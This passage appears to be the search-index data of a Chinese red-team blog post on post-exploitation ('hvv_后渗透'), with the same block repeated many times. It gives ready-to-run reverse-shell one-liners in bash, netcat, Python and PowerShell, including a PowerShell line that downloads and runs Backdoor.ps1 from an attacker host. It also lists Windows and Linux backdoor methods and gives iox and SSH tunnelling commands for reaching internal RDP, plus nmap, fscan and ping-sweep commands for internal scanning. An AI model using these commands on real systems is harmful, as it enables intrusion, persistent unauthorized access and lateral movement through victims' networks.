本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#linux"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4利用iis等服务制作后门"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#41-探测是否出网"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#42-网络层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#43-传输层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#44-应用层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#45-dnsiodine"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#横向移动"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 